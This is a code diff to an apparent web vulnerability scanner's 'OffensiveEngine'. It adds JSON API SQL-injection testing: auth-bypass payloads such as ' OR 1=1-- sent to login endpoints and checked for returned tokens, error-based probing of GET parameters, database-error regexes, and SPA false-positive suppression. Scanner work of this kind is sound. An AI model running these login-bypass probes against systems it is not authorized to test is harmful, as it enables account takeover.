@@ -145,6 +145,32 @@ SSRF_PARAMS = {
     "view", "remote", "api", "endpoint", "data", "reference", "ref",
 }
 
+# Database error signatures for error-based SQLi detection on JSON APIs (the
+# engine otherwise leans on sqlmap, which only tested GET params on the SPA
+# root). A real DB error in an API response is a high-confidence injection
+# signal that a benign control request never produces.
+SQL_ERROR_RE = re.compile(
+    r"(SQLITE_ERROR|no such column|unrecognized token|sqlite3\.|"
+    r"You have an error in your SQL syntax|MySQLSyntaxError|mysql_fetch|"
+    r"valid MySQL result|com\.mysql\.jdbc|"
+    r"syntax error at or near|unterminated quoted string|PSQLException|PG::\w+Error|"
+    r"Unclosed quotation mark|Incorrect syntax near|System\.Data\.SqlClient|"
+    r"ORA-\d{5}|quoted string not properly terminated|"
+    r"SQLSTATE\[|SequelizeDatabaseError|SQLException|near \"[^\"]*\": syntax error)",
+    re.IGNORECASE,
+)
+
+# A JWT in an auth response is a strong 'you are now logged in' signal.
+JWT_RE = re.compile(r"eyJ[A-Za-z0-9_\-]{6,}\.eyJ[A-Za-z0-9_\-]{6,}\.")
+
+# Identifier/password field names an API login body typically uses.
+LOGIN_ID_FIELDS = ("email", "username", "user", "login", "identifier", "userName", "name")
+LOGIN_PW_FIELDS = ("password", "pass", "pwd", "passwd")
+
+# SQLi auth-bypass payloads for a login identifier field (read-only: they log in
+# as an existing user, never modify data).
+LOGIN_SQLI_PAYLOADS = ("' OR 1=1--", "' OR '1'='1", "' OR 1=1-- -", "admin'--", "' OR 1=1#")
+
 # High-signal candidate names for active parameter mining (arjun style).
 PARAM_MINE_CANDIDATES = [
     "id", "page", "file", "dir", "path", "url", "redirect", "next", "q", "s",
@@ -2683,6 +2709,242 @@ class OffensiveEngine:
         except Exception:
             return None
 
+    # ── API-aware injection (JSON APIs, not just query strings) ──────────────
+    def _api_endpoints(self, base_url: str, urls: list) -> list:
+        """Same-host REST/API-shaped endpoints from the crawl (/rest/, /api/,
+        /graphql, /v1..). These are where a SPA's real vulns live; the engine's
+        other probes target query strings on the SPA root, which just returns the
+        shell."""
+        base_host = urlparse(base_url).netloc
+        out, seen = [], set()
+        for u in urls or []:
+            p = urlparse(u)
+            if p.netloc and p.netloc != base_host:
+                continue
+            low = p.path.lower()
+            if re.search(r"(^|/)(rest|api|graphql|v\d+)(/|$)", low):
+                key = (p.path, tuple(sorted(parse_qs(p.query).keys())))
+                if key not in seen:
+                    seen.add(key)
+                    out.append(u if p.netloc else urljoin(base_url, u))
+        return out
+
+    def _login_endpoints(self, base_url: str, api_urls: list) -> list:
+        """Login/auth endpoints to test for auth-bypass SQLi, from the crawl plus
+        the well-known defaults. Deduped, same-host."""
+        cands = []
+        for u in api_urls:
+            if re.search(r"(login|signin|authenticate|/auth\b|/session)", urlparse(u).path, re.I):
+                cands.append(u.split("?")[0])
+        for d in ("/rest/user/login", "/api/login", "/login", "/api/auth/login",
+                  "/api/v1/login", "/user/login", "/auth/login", "/api/sessions"):
+            cands.append(urljoin(base_url, d))
+        return list(dict.fromkeys(cands))
+
+    async def test_api_injection(self, base_url: str, urls: list) -> list:
+        """Attack the JSON API the SPA sits on top of, which the query-string
+        probes miss entirely:
+
+          * login auth-bypass SQLi: POST a JSON body with a SQLi payload in the
+            identifier field; a token/JWT that a benign control login does NOT
+            return is a confirmed auth bypass (CRITICAL);
+          * error-based SQLi on API GET params and login fields: a real DB error
+            in the response that a benign value never produces (HIGH).
+
+        Read-only: login SQLi logs in as an existing user, it never writes. Every
+        positive gets an HttpExchange proof."""
+        import httpx
+        await self._ensure_catch_all(base_url)
+        api_urls = self._api_endpoints(base_url, urls)
+        findings = []
+        await self.log(f"API injection: probing {len(api_urls)} REST/API endpoint(s) "
+                       "(JSON login SQLi + error-based)", "info")
+
+        try:
+            async with httpx.AsyncClient(timeout=10, verify=False, follow_redirects=False,
+                                         headers=self._auth_headers()) as c:
+                findings += await self._api_login_sqli(c, base_url, api_urls)
+                findings += await self._api_get_sqli(c, api_urls)
+        except Exception as e:
+            await self.log(f"API injection error: {e}", "warn")
+
+        await self.log(f"API injection complete: {len(findings)} finding(s)",
+                       "success" if findings else "info")
+        return findings
+
+    async def _api_login_sqli(self, c, base_url: str, api_urls: list) -> list:
+        findings = []
+        control_pw = "yggControlPw!9137"
+        for ep in self._login_endpoints(base_url, api_urls)[:10]:
+            # Control: a definitely-invalid login should NOT return a token.
+            control_id = f"ygg-nonexistent-{os.urandom(4).hex()}@example.invalid"
+            control_tok = await self._post_login(c, ep, control_id, control_pw)
+            if control_tok is True:
+                continue  # endpoint hands a token to anyone; can't use it as a control
+            for payload in LOGIN_SQLI_PAYLOADS:
+                r = await self._post_login(c, ep, payload, control_pw, want_response=True)
+                if r is None:
+                    continue
+                body = r.text or ""
+                has_token = bool(JWT_RE.search(body)) or self._json_has_token(body)
+                if has_token and r.status_code in (200, 201):
+                    fnd = await self.add_finding(
+                        title="SQL Injection — authentication bypass (login API)",
+                        severity="critical",
+                        description=(f"A SQL-injection payload in the login identifier field of {ep} "
+                                     "returned a valid authentication token, while a benign invalid "
+                                     "login did not. This is a full authentication bypass: an "
+                                     "attacker logs in as (typically) the first/admin user without "
+                                     "credentials."),
+                        evidence=(f"POST {ep}\nIdentifier payload: {payload}\n"
+                                  f"Response status: {r.status_code}\n"
+                                  f"Auth token returned: yes (control login returned none)"),
+                        cvss_score=9.8,
+                        remediation=("Use parameterized queries / an ORM for the login lookup; never "
+                                     "build the auth SQL by string-concatenating user input."))
+                    try:
+                        await self._capture_proof(ep, fnd.id if fnd else None,
+                                                  notes="Login SQLi auth bypass", method="POST",
+                                                  data={"_note": "JSON body with SQLi identifier"})
+                    except Exception:
+                        pass
+                    findings.append({"type": "sqli-auth-bypass", "url": ep, "severity": "critical"})
+                    break  # one confirmation per endpoint is enough
+                if SQL_ERROR_RE.search(body):
+                    await self.add_finding(
+                        title="SQL Injection (error-based) in login API",
+                        severity="high",
+                        description=(f"The login endpoint {ep} returned a database error when its "
+                                     "identifier field received a single quote, confirming the input "
+                                     "reaches a SQL query unsanitized."),
+                        evidence=f"POST {ep}\nPayload: {payload}\nDB error in response body.",
+                        cvss_score=8.2,
+                        remediation="Use parameterized queries for authentication lookups.")
+                    findings.append({"type": "sqli-error-login", "url": ep, "severity": "high"})
+                    break
+        return findings
+
+    async def _post_login(self, c, ep, identifier, password, want_response=False):
+        """POST a JSON login body trying the common identifier field names.
+        Returns True if a token came back (control mode), the httpx Response if
+        want_response, or False/None. Never raises."""
+        for id_field in ("email", "username", "user"):
+            body = {id_field: identifier, "password": password}
+            try:
+                r = await c.post(ep, json=body)
+            except Exception:
+                continue
+            if want_response:
+                return r
+            if r.status_code in (200, 201) and (JWT_RE.search(r.text or "") or self._json_has_token(r.text or "")):
+                return True
+        return None if want_response else False
+
+    @staticmethod
+    def _json_has_token(body: str) -> bool:
+        try:
+            data = json.loads(body)
+        except Exception:
+            return False
+        blob = json.dumps(data).lower()
+        return any(k in blob for k in ('"token"', '"authentication"', '"access_token"',
+                                       '"jwt"', '"sessionid"', '"accesstoken"'))
+
+    async def _api_get_sqli(self, c, api_urls: list) -> list:
+        """Error-based SQLi on API GET parameters: send a single quote in each
+        parameter and flag a response that surfaces a DB error a benign value
+        never produces."""
+        findings = []
+        param_eps = [u for u in api_urls if "?" in u and "=" in u][:25]
+        for u in param_eps:
+            parsed = urlparse(u)
+            pairs = parse_qsl(parsed.query, keep_blank_values=True)
+            for i, (k, _v) in enumerate(pairs):
+                benign = list(pairs)
+                benign[i] = (k, "ygg9137")
+                inj = list(pairs)
+                inj[i] = (k, "ygg9137'")
+                try:
+                    rb = await c.get(urlunparse(parsed._replace(query=urlencode(benign))))
+                    ri = await c.get(urlunparse(parsed._replace(query=urlencode(inj))))
+                except Exception:
+                    continue
+                if SQL_ERROR_RE.search(ri.text or "") and not SQL_ERROR_RE.search(rb.text or ""):
+                    fnd = await self.add_finding(
+                        title="SQL Injection (error-based) in API parameter",
+                        severity="high",
+                        description=(f"Parameter '{k}' on {parsed.path} returned a database error when "
+                                     "given a single quote, while a benign value did not. The input "
+                                     "reaches a SQL query unsanitized."),
+                        evidence=(f"GET {parsed.path}?{k}=ygg9137'  -> DB error\n"
+                                  f"GET {parsed.path}?{k}=ygg9137   -> clean"),
+                        cvss_score=8.2,
+                        remediation="Use parameterized queries / an ORM; never concatenate request "
+                                    "parameters into SQL.")
+                    try:
+                        await self.capture(ri, finding_id=fnd.id if fnd else None,
+                                           notes=f"Error-based SQLi on {k}")
+                    except Exception:
+                        pass
+                    findings.append({"type": "sqli-error-api", "url": u, "param": k, "severity": "high"})
+                    break  # one param confirmation per endpoint
+        return findings
+
+    async def _ensure_catch_all(self, base_url: str):
+        """Detect (once, cached) whether the target is a catch-all/SPA that serves
+        the same shell for every unknown path. Fetches a few known-nonexistent
+        paths and asks core.spa_detect. Once known, _is_spa_shell() lets every
+        200-hit check suppress the shell instead of reporting it as 'reachable'
+        (the Juice Shop false-positive class: /.git, /.env, /admin all 200)."""
+        if getattr(self, "_catch_all_for", None) == base_url:
+            return getattr(self, "_catch_all", None)
+        self._catch_all_for = base_url
+        self._catch_all = None
+        import httpx
+        import secrets as _secrets
+        from core import spa_detect
+        samples = []
+        try:
+            async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True,
+                                         headers=self._auth_headers()) as c:
+                for _ in range(3):
+                    probe = f"{base_url.rstrip('/')}/ygg-nope-{_secrets.token_hex(10)}"
+                    try:
+                        r = await c.get(probe)
+                        samples.append((r.status_code, r.text or ""))
+                    except Exception:
+                        continue
+        except Exception:
+            return None
+        self._catch_all = spa_detect.detect_catch_all(samples)
+        if self._catch_all:
+            await self.log(
+                f"SPA/catch-all detected: every unknown path returns a {self._catch_all.status} "
+                f"shell (~{self._catch_all.length} bytes). Suppressing shell responses as findings "
+                "and focusing tests on endpoints that behave differently.", "info")
+        return self._catch_all
+
+    def _is_spa_shell(self, status: int, body: str) -> bool:
+        """True when a response is just the catch-all app shell (so it must not be
+        reported as a real endpoint/exposure). Safe before detection runs."""
+        ca = getattr(self, "_catch_all", None)
+        return bool(ca) and ca.matches(status, body or "")
+
+    async def _hit_is_catch_all(self, url: str) -> bool:
+        """GET `url` and report whether the response is just the catch-all shell.
+        Drops content-discovery hits ffuf's auto-calibration still let through on
+        a SPA. Never raises; unknown -> False (keep the hit)."""
+        if not getattr(self, "_catch_all", None):
+            return False
+        try:
+            import httpx
+            async with httpx.AsyncClient(timeout=6, verify=False, follow_redirects=True,
+                                         headers=self._auth_headers()) as c:
+                r = await c.get(url)
+            return self._is_spa_shell(r.status_code, r.text or "")
+        except Exception:
+            return False
+
     async def _validate_and_report_sensitive_hit(self, url: str, baseline_body: str = ""):
         """Follow up a status=200 sensitive-looking path with a real GET, validate
         the BODY (not just the status code) via core.web_security.
@@ -2700,6 +2962,14 @@ class OffensiveEngine:
                 r = await c.get(url)
         except Exception:
             return None
+        # Catch-all guard: if this is just the SPA shell, it is not a real
+        # exposure no matter what the path name is.
+        if self._is_spa_shell(r.status_code, r.text or ""):
+            return None
+        # Use the detected shell as the baseline when the caller didn't supply one,
+        # so classify_sensitive_path_hit's own similarity suppression also fires.
+        if not baseline_body and getattr(self, "_catch_all", None):
+            baseline_body = self._catch_all.sample
         hit = classify_sensitive_path_hit(
             _urlparse(url).path, r.status_code, r.text or "",
             content_type=r.headers.get("content-type", ""), baseline_body=baseline_body)
@@ -2744,6 +3014,8 @@ class OffensiveEngine:
         # always 'tested' (osv-scanner only deepens deep-mode manifest coverage,
         # its absence never zeroes the pass).
         status["dependencies"] = "tested"
+        # API-aware injection is built-in (no external tool), always tested.
+        status["api_injection"] = "tested"
         return status
 
     async def run_offensive(
@@ -2823,6 +3095,11 @@ class OffensiveEngine:
             f"Attack surface: {len(urls)} unique endpoints ({params} parameterized) "
             f"from crawl + archives + param mining + API/SPA seeding + specs", "info")
 
+        # Detect SPA/catch-all behavior up front so every 200-hit check can
+        # suppress the app shell instead of reporting it as a real endpoint, and
+        # so the report doesn't fill with false positives on modern SPAs.
+        await self._ensure_catch_all(base_url)
+
         # Form/POST attack surface (logins, searches, checkout) — the inputs a
         # URL crawler never exposes, and where auth-bypass SQLi / stored XSS live.
         forms = await self.discover_forms([base_url] + urls)
@@ -2874,6 +3151,15 @@ class OffensiveEngine:
             deps = []
         dep_vuln_findings = [d for d in deps if d.get("vuln_ids")]
 
+        # API-aware injection: attack the JSON API (login auth-bypass SQLi,
+        # error-based SQLi) the SPA sits on. This is what the query-string probes
+        # miss on modern apps.
+        try:
+            apihits = await self.test_api_injection(base_url, urls)
+        except Exception as e:
+            await self.log(f"API injection error: {e}", "warn")
+            apihits = []
+
         result = {
             "crawled_urls": len(urls),
             "endpoints": urls[:2000],   # real attack surface for the inventory
@@ -2895,6 +3181,7 @@ class OffensiveEngine:
             "dom": _safe(domx),
             "oob": _safe(oob),
             "js_secrets": _safe(jssec),
+            "api_injection": _safe(apihits),
             "dependencies": deps if isinstance(deps, list) else [],
             "source_map_endpoints": getattr(self, "_source_map_endpoints", []),
         }
@@ -2933,6 +3220,6 @@ class OffensiveEngine:
 
         total = sum(len(_safe(v)) for v in
                     (sqli, xss, dast, auth, trav, zap, ssrf, ssti, oredir, cors, hosthdr,
-                     fuzz, formhits, domx, oob, jssec)) + len(dep_vuln_findings)
+                     fuzz, formhits, domx, oob, jssec, apihits)) + len(dep_vuln_findings)
         await self.log(f"⚔ Offensive engine complete: {total} injection/access/DAST findings across {len(urls)} URLs", "success")
         return result
